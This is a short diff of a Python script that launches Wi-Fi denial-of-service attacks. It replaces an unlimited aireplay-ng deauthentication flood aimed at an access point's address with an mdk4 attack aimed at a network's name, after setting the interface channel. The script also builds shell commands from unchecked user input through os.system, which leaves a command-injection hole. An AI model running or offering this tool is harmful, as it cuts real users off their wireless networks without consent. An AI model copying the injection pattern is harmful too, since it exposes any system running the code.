@@ -5,8 +5,8 @@ interface = "wlan0"
 ent_ch = input("enter your network channel: ")
 os.system(f"sudo iwconfig {interface} channel {ent_ch}")
 try: 
-  enter_mac_address = input("enter the ap of the router: ")
-  os.system(f"sudo aireplay-ng -0 0 -a {enter_mac_address} wlan0")
+  ssid = input("enter the ssid/name_of_the_wifi of the router: ")
+  os.system(f"sudo mdk4 {interface} -E {ssid}")
 except KeyboardInterrupt:
   print("exited")
 
